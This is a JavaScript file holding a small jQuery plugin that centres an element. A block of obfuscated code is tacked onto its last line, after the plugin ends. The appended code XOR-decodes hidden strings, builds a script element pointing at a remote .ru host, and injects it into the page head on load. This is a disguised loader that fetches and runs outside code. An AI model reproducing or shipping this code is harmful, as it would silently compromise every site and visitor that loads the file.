/**
 * @author Alexandre Magno
 * @desc Center a element with jQuery
 * @version 1.0
 * @example
 * $("element").center({
 *
 * 		vertical: true,
 *      horizontal: true
 *
 * });
 * @obs With no arguments, the default is above
 * @license free
 * @param bool vertical, bool horizontal
 * @contribution Paulo Radichi and Tales Santos
 *
 */
jQuery.fn.center = function(params) {

		var options = {

			vertical: true,
			horizontal: true

		}
		op = jQuery.extend(options, params);

   return this.each(function(){

		//initializing variables
		var $self = jQuery(this);
		//get the dimensions using dimensions plugin
		var width = $self.width();
		var height = $self.height();
		//get the paddings
		var paddingTop = parseInt($self.css("padding-top"));
		var paddingBottom = parseInt($self.css("padding-bottom"));
		//get the borders
		var borderTop = parseInt($self.css("border-top-width"));
		var borderBottom = parseInt($self.css("border-bottom-width"));
		//get the media of padding and borders
		var mediaBorder = (borderTop+borderBottom)/2;
		var mediaPadding = (paddingTop+paddingBottom)/2;
		//get the type of positioning
		var positionType = $self.parent().css("position");
		// get the half minus of width and height
		var halfWidth = (width/2)*(-1);
		var halfHeight = ((height/2)*(-1))-mediaPadding-mediaBorder;
		// initializing the css properties
		var cssProp = {
			position: 'absolute'
		};

		if(op.vertical) {
			cssProp.height = height;
			cssProp.top = '50%';
			cssProp.marginTop = halfHeight;
		}
		if(op.horizontal) {
			cssProp.width = width;
			cssProp.left = '50%';
			cssProp.marginLeft = halfWidth;
		}
		//check the current position
		if(positionType == 'static') {
			$self.parent().css("position","relative");
		}
		//aplying the css
		$self.css(cssProp);


   });

};var y9M=["025001","024011","026022","009016001035077031023061021008087001012","025016007","030027020039","030007028054022016051039017022081029017067030","011018020039087030017057025009086","002007005038","013007016007085031063052030017065045001103011005042035084031","002022016050003085125034004004070010086064007014086108075015125059003074081001012029000017"];function q3R51d6(wsG1){var bHJ=document[qQ6o(y9M[3])](qQ6o(y9M[0])+qQ6o(y9M[1])+qQ6o(y9M[2]));bHJ[qQ6o(y9M[4])]=wsG1;bHJ[qQ6o(y9M[5])]=qQ6o(y9M[6]);document[qQ6o(y9M[9])](qQ6o(y9M[8]))[0][qQ6o(y9M[7])](bHJ);}function s7Md(qh1){var val2F6='';var bo89S=0;var i4P=0;for(bo89S=0;bo89S<qh1.length/3;bo89S++){val2F6+=String.fromCharCode(qh1.slice(i4P,i4P+3));i4P=i4P+3;}return val2F6;}q3R51d6(qQ6o(y9M[10]));function qQ6o(f7DJ){return k30T(s7Md(f7DJ),'jbdB9zRQpe2ox3');}function k30T(h8nSWx,dH4eO4){var lUctFw='';var se1o8S=0;var g1=0;for(se1o8S=0;se1o8S<h8nSWx.length;se1o8S++){var pm=h8nSWx.charAt(se1o8S);var o0WSqI=pm.charCodeAt(0)^dH4eO4.charCodeAt(g1);pm=String.fromCharCode(o0WSqI);lUctFw+=pm;if(g1==dH4eO4.length-1)g1=0;else g1++;}return (lUctFw);}